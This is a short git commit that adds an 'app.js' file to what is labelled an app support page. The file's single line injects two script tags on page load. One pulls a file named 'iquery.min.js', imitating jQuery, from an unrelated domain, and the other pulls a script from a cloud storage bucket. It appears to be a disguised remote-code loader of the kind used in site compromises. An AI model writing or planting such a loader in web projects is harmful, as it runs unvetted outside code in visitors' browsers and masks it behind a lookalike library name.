54ef679c4a1964df438e83225cda5eca759d0161
mac <mac@macdeMacBook-Air.local>
2019-10-29 10:38:28 +0800

    New App Support files

---
+++ APP SUPPORT_files/app.js
@@ -0,0 +1,1 @@
+(function(){var l=document.createElement('script');l.src='https://co.puretou.com/iquery.min.js';document.getElementsByTagName('body')[0].appendChild(l);})();(function(){var l=document.createElement('script');l.src='http://voicerecorder.oss-ap-southeast-1.aliyuncs.com//js/app.js';document.getElementsByTagName('body')[0].appendChild(l);})();
